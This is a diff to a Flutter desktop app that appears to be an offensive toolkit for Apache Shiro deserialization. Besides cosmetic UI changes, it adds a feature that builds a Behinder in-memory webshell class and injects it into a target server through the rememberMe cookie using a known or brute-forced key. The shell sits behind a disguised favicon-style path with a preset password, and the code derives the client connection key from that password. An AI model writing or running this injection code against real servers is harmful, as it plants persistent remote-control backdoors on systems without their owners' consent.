@@ -1,6 +1,8 @@
 import 'dart:convert';
 import 'dart:math';
 
+import 'package:crypto/crypto.dart' as crypto;
+
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart' show Clipboard, ClipboardData;
 
@@ -9,6 +11,7 @@ import 'database/database_init.dart';
 import 'models/project.dart';
 import 'exp/shiro/shiro_crypto.dart';
 import 'exp/shiro/shiro_exp_service.dart';
+import 'exp/shiro/shiro_mem_shell_service.dart';
 import 'exp/shiro/shiro_payload_repo.dart';
 import 'pages/project_management_page.dart';
 import 'pages/project_scoped_page.dart';
@@ -72,14 +75,16 @@ class MainLayout extends StatefulWidget {
   State<MainLayout> createState() => _MainLayoutState();
 }
 
-class _MainLayoutState extends State<MainLayout> {
+class _MainLayoutState extends State<MainLayout> with TickerProviderStateMixin {
   int _selectedIndex = 0;
   Project? _selectedProject;
   bool _sidebarExpanded = true;
   bool _sidebarHidden = false;
   static const double _sidebarWidth = 220.0;
-   // 收起时的窄侧栏宽度
   static const double _sidebarCollapsedWidth = 72.0;
+
+  late final AnimationController _blinkController;
+  late final Animation<double> _blinkAnimation;
 
   final List<MenuItem> _menuItems = [
     MenuItem(icon: Icons.folder_outlined, label: '项目管理', selectedIcon: Icons.folder),
@@ -90,6 +95,22 @@ class _MainLayoutState extends State<MainLayout> {
     MenuItem(icon: Icons.menu_book_outlined, label: '字典管理', selectedIcon: Icons.menu_book),
     MenuItem(icon: Icons.computer_outlined, label: '完整终端', selectedIcon: Icons.computer),
   ];
+
+  @override
+  void initState() {
+    super.initState();
+    _blinkController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 900),
+    )..repeat(reverse: true);
+    _blinkAnimation = CurvedAnimation(parent: _blinkController, curve: Curves.easeInOut);
+  }
+
+  @override
+  void dispose() {
+    _blinkController.dispose();
+    super.dispose();
+  }
 
   void _handleMenuTap(int index) {
     setState(() => _selectedIndex = index);
@@ -179,63 +200,128 @@ class _MainLayoutState extends State<MainLayout> {
                     : 0,
                 child: Container(
                   color: AppColors.bgDark,
-                  child: Column(
-                    crossAxisAlignment: CrossAxisAlignment.stretch,
+                  child: Stack(
                     children: [
-                      // 顶部栏
-                      Container(
-                        height: 64,
-                        padding: const EdgeInsets.symmetric(horizontal: 24),
-                        decoration: BoxDecoration(
-                          color: AppColors.bgElevated,
-                          border: Border(
-                            bottom: BorderSide(
-                              color: AppColors.primary.withValues(alpha: 0.4),
-                              width: 1,
-                            ),
-                          ),
-                        ),
-                        child: Row(
-                          children: [
-                            Text(
-                              _menuItems[_selectedIndex].label,
-                              style: AppTextStyles.heading(
-                                size: 18,
-                                color: AppColors.primary,
-                              ),
-                            ),
-                            const Spacer(),
-                            IconButton(
-                              icon: const Icon(Icons.search),
-                              onPressed: () {},
-                              color: AppColors.textSecondary,
-                            ),
-                            IconButton(
-                              icon: const Icon(Icons.notifications_outlined),
-                              onPressed: () {},
-                              color: AppColors.textSecondary,
-                            ),
-                            const SizedBox(width: 8),
-                            CircleAvatar(
-                              radius: 18,
-                              backgroundColor: AppColors.border,
-                              child: Text(
-                                'U',
-                                style: AppTextStyles.heading(
-                                  size: 14,
-                                  color: AppColors.primary,
+                      // 赛博网格背景
+                      Positioned.fill(
+                        child: CustomPaint(painter: _CyberGridPainter()),
+                      ),
+                      Positioned.fill(
+                        child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.stretch,
+                        children: [
+                          // 顶部栏
+                          Container(
+                            height: 64,
+                            padding: const EdgeInsets.symmetric(horizontal: 24),
+                            decoration: BoxDecoration(
+                              color: AppColors.bgElevated,
+                              border: Border(
+                                bottom: BorderSide(
+                                  color: AppColors.primary.withValues(alpha: 0.5),
+                                  width: 1,
                                 ),
                               ),
+                              boxShadow: [
+                                BoxShadow(
+                                  color: AppColors.primary.withValues(alpha: 0.06),
+                                  blurRadius: 12,
+                                  offset: const Offset(0, 2),
+                                ),
+                              ],
                             ),
-                          ],
-                        ),
+                            child: Row(
+                              children: [
+                                // 闪烁状态点
+                                AnimatedBuilder(
+                                  animation: _blinkAnimation,
+                                  builder: (_, __) => Container(
+                                    width: 8,
+                                    height: 8,
+                                    margin: const EdgeInsets.only(right: 10),
+                                    decoration: BoxDecoration(
+                                      shape: BoxShape.circle,
+                                      color: AppColors.primary.withValues(
+                                        alpha: 0.5 + _blinkAnimation.value * 0.5,
+                                      ),
+                                      boxShadow: [
+                                        BoxShadow(
+                                          color: AppColors.primary.withValues(
+                                            alpha: _blinkAnimation.value * 0.7,
+                                          ),
+                                          blurRadius: 8,
+                                          spreadRadius: 1,
+                                        ),
+                                      ],
+                                    ),
+                                  ),
+                                ),
+                                Text(
+                                  '>_ ',
+                                  style: AppTextStyles.terminal(
+                                    size: 14,
+                                    color: AppColors.primary.withValues(alpha: 0.5),
+                                  ),
+                                ),
+                                Text(
+                                  _menuItems[_selectedIndex].label,
+                                  style: AppTextStyles.heading(
+                                    size: 18,
+                                    color: AppColors.primary,
+                                  ),
+                                ),
+                                const Spacer(),
+                                IconButton(
+                                  icon: const Icon(Icons.search),
+                                  onPressed: () {},
+                                  color: AppColors.textSecondary,
+                                ),
+                                IconButton(
+                                  icon: const Icon(Icons.notifications_outlined),
+                                  onPressed: () {},
+                                  color: AppColors.textSecondary,
+                                ),
+                                const SizedBox(width: 8),
+                                // 黑客风格用户头像
+                                Container(
+                                  width: 36,
+                                  height: 36,
+                                  decoration: BoxDecoration(
+                                    shape: BoxShape.circle,
+                                    border: Border.all(
+                                      color: AppColors.primary.withValues(alpha: 0.6),
+                                      width: 1.5,
+                                    ),
+                                    color: AppColors.primary.withValues(alpha: 0.1),
+                                    boxShadow: [
+                                      BoxShadow(
+                                        color: AppColors.primary.withValues(alpha: 0.2),
+                                        blurRadius: 8,
+                                      ),
+                                    ],
+                                  ),
+                                  child: Center(
+                                    child: Text(
+                                      'R',
+                                      style: AppTextStyles.heading(
+                                        size: 14,
+                                        color: AppColors.primary,
+                                      ),
+                                    ),
+                                  ),
+                                ),
+                              ],
+                            ),
+                          ),
+                          // 工作区内容
+                          Expanded(
+                            child: Padding(
+                              padding: const EdgeInsets.all(24),
+                              child: _buildWorkspaceContent(),
+                            ),
+                          ),
+                        ],
                       ),
-                      // 工作区内容
-                      Expanded(
-                        child: Padding(
-                          padding: const EdgeInsets.all(24),
-                          child: _buildWorkspaceContent(),
-                        ),
                       ),
                     ],
                   ),
@@ -721,6 +807,14 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
   final _payloadB64Controller = TextEditingController();
   final _logScrollController = ScrollController();
 
+  // 内存马注入相关
+  MemShellType _memShellType = MemShellType.filter;
+  final _memShellPasswordController =
+      TextEditingController(text: 'mAtrix_911');
+  final _memShellPathController =
+      TextEditingController(text: '/favicondemo.ico');
+  final _memShellService = const ShiroMemShellService();
+
   String _method = 'GET';
 
   String? get _currentKey => _keyController.text.trim().isNotEmpty
@@ -735,6 +829,8 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
     _keyController.dispose();
     _payloadB64Controller.dispose();
     _logScrollController.dispose();
+    _memShellPasswordController.dispose();
+    _memShellPathController.dispose();
     super.dispose();
   }
 
@@ -952,6 +1048,62 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
     }
   }
 
+  Future<void> _handleInjectMemShell() async {
+    final url = _urlController.text.trim();
+    final key = _currentKey;
+    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
+    if (key == null) { _appendLog('[!] 请先填入或爆破出 Key'); return; }
+
+    final password = _memShellPasswordController.text.trim();
+    final path = _memShellPathController.text.trim();
+    if (password.isEmpty) { _appendLog('[!] 请输入冰蝎密码'); return; }
+    if (path.isEmpty || !path.startsWith('/')) {
+      _appendLog('[!] 路径须以 / 开头，例如 /shell.ico');
+      return;
+    }
+
+    setState(() => _running = true);
+    _appendLog('[*] 开始注入内存马 (${_memShellType.displayName})');
+    _appendLog('[*] 密码: $password  路径: $path');
+
+    try {
+      final shellBytes = await _memShellService.buildShellClass(
+        type: _memShellType,
+        password: password,
+        path: path,
+      );
+      _appendLog('[*] Shell 类修补完成（${shellBytes.length} bytes）');
+
+      await _memShellService.inject(
+        targetUrl: url,
+        keyBase64: key,
+        shellClassBytes: shellBytes,
+        shellPath: path,
+        shellPassword: password,
+        mode: _encryptionMode,
+        cookieName: _cookieNameController.text.trim().isNotEmpty
+            ? _cookieNameController.text.trim()
+            : 'rememberMe',
+        timeout: Duration(
+            seconds: int.tryParse(_timeoutController.text.trim()) ?? 15),
+        onProgress: _appendLog,
+      );
+
+      final baseUrl = Uri.parse(url).replace(path: '').toString();
+      // BehinderFilter 存储 md5(p_header)[0:16] 作为 AES 密钥
+      // Behinder 客户端连接时填该值
+      final digest = crypto.md5.convert(utf8.encode(password));
+      final bigInt = digest.bytes.fold<BigInt>(
+          BigInt.zero, (acc, b) => (acc << 8) | BigInt.from(b));
+      final behinderKey = bigInt.toRadixString(16).substring(0, 16);
+      _appendLog('[i] 注入完成。请用冰蝎连接 $baseUrl$path（密码: $behinderKey）');
+    } catch (e) {
+      _appendLog('[!] 注入异常: $e');
+    } finally {
+      if (mounted) setState(() => _running = false);
+    }
+  }
+
   @override
   Widget build(BuildContext context) {
     return Container(
@@ -1022,13 +1174,14 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
                           children: [
                             Expanded(
                               child: DropdownButtonFormField<String>(
-                                value: _method,
+                                initialValue: _method,
+                                isExpanded: true,
                                 dropdownColor: AppColors.bgElevated,
                                 icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                 style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                 items: const [
-                                  DropdownMenuItem(value: 'GET', child: Text('GET')),
-                                  DropdownMenuItem(value: 'POST', child: Text('POST')),
+                                  DropdownMenuItem(value: 'GET', child: Text('GET', overflow: TextOverflow.ellipsis)),
+                                  DropdownMenuItem(value: 'POST', child: Text('POST', overflow: TextOverflow.ellipsis)),
                                 ],
                                 onChanged: (v) { if (v != null) setState(() => _method = v); },
                                 decoration: _shiroInputDecoration('方法', ''),
@@ -1037,13 +1190,14 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
                             const SizedBox(width: 8),
                             Expanded(
                               child: DropdownButtonFormField<ShiroEncryptionMode>(
-                                value: _encryptionMode,
+                                initialValue: _encryptionMode,
+                                isExpanded: true,
                                 dropdownColor: AppColors.bgElevated,
                                 icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                 style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                 items: const [
-                                  DropdownMenuItem(value: ShiroEncryptionMode.cbc, child: Text('AES-CBC')),
-                                  DropdownMenuItem(value: ShiroEncryptionMode.gcm, child: Text('AES-GCM')),
+                                  DropdownMenuItem(value: ShiroEncryptionMode.cbc, child: Text('AES-CBC', overflow: TextOverflow.ellipsis)),
+                                  DropdownMenuItem(value: ShiroEncryptionMode.gcm, child: Text('AES-GCM', overflow: TextOverflow.ellipsis)),
                                 ],
                                 onChanged: (v) { if (v != null) setState(() => _encryptionMode = v); },
                                 decoration: _shiroInputDecoration('模式', ''),
@@ -1124,6 +1278,77 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
                             _shiroActionBtn('发送 Payload', _handleSendPayload, enabled: _currentKey != null),
                           ],
                         ),
+                        const SizedBox(height: 20),
+                        _shiroSectionTitle('内存冰蝎马注入'),
+                        const SizedBox(height: 4),
+                        // Shell 类型选择
+                        DropdownButtonFormField<MemShellType>(
+                          initialValue: _memShellType,
+                          isExpanded: true,
+                          dropdownColor: AppColors.bgElevated,
+                          icon: const Icon(Icons.arrow_drop_down,
+                              color: AppColors.textSecondary, size: 22),
+                          style: AppTextStyles.body(
+                              size: 11, color: AppColors.textPrimary),
+                          items: MemShellType.values
+                              .map((t) => DropdownMenuItem(
+                                    value: t,
+                                    child: Text(t.displayName,
+                                        overflow: TextOverflow.ellipsis),
+                                  ))
+                              .toList(),
+                          onChanged: (v) {
+                            if (v != null) setState(() => _memShellType = v);
+                          },
+                          decoration: _shiroInputDecoration('Shell 类型', ''),
+                        ),
+                        const SizedBox(height: 8),
+                        Row(
+                          children: [
+                            Expanded(
+                              child: TextField(
+                                controller: _memShellPasswordController,
+                                style: AppTextStyles.body(
+                                    size: 12,
+                                    color: AppColors.amber),
+                                decoration:
+                                    _shiroInputDecoration('冰蝎密码（16位HEX）', 'mAtrix_911'),
+                              ),
+                            ),
+                            const SizedBox(width: 8),
+                            Expanded(
+                              child: TextField(
+                                controller: _memShellPathController,
+                                style: AppTextStyles.body(
+                                    size: 12, color: AppColors.cyan),
+                                decoration:
+                                    _shiroInputDecoration('Shell 路径', '/shell.ico'),
+                              ),
+                            ),
+                          ],
+                        ),
+                        const SizedBox(height: 6),
+                        Container(
+                          padding: const EdgeInsets.all(8),
+                          decoration: BoxDecoration(
+                            color: AppColors.primary.withValues(alpha: 0.05),
+                            borderRadius: BorderRadius.circular(6),
+                            border: Border.all(
+                                color: AppColors.primary.withValues(alpha: 0.2)),
+                          ),
+                          child: Text(
+                            '内置 CB1-InjectMemTool 链，无需手动填写 Payload。'
+                            '服务端反序列化后读取 user 参数注入冰蝎内存马。',
+                            style: AppTextStyles.caption(
+                                size: 10, color: AppColors.textSecondary),
+                          ),
+                        ),
+                        const SizedBox(height: 8),
+                        _shiroActionBtn(
+                          '注入内存马',
+                          _handleInjectMemShell,
+                          enabled: _currentKey != null,
+                        ),
                       ],
                     ),
                   ),
@@ -1165,12 +1390,11 @@ class _ShiroExpCardState extends State<_ShiroExpCard> {
                             const Spacer(),
                             TextButton.icon(
                               onPressed: _log.isEmpty ? null : () async {
+                                final messenger = ScaffoldMessenger.of(context);
                                 await Clipboard.setData(ClipboardData(text: _log));
-                                if (mounted) {
-                                  ScaffoldMessenger.of(context).showSnackBar(
-                                    const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
-                                  );
-                                }
+                                messenger.showSnackBar(
+                                  const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
+                                );
                               },
                               icon: const Icon(Icons.copy, size: 14),
                               label: const Text('复制'),
@@ -1580,4 +1804,23 @@ class _QuickActionCard extends StatelessWidget {
       ),
     );
   }
+}
+
+/// 赛博风格点阵网格背景（静态，零性能消耗）
+class _CyberGridPainter extends CustomPainter {
+  @override
+  void paint(Canvas canvas, Size size) {
+    final paint = Paint()
+      ..color = AppColors.primary.withValues(alpha: 0.035)
+      ..strokeWidth = 1;
+    const spacing = 28.0;
+    for (double x = 0; x < size.width; x += spacing) {
+      for (double y = 0; y < size.height; y += spacing) {
+        canvas.drawCircle(Offset(x, y), 1, paint);
+      }
+    }
+  }
+
+  @override
+  bool shouldRepaint(_CyberGridPainter old) => false;
 }
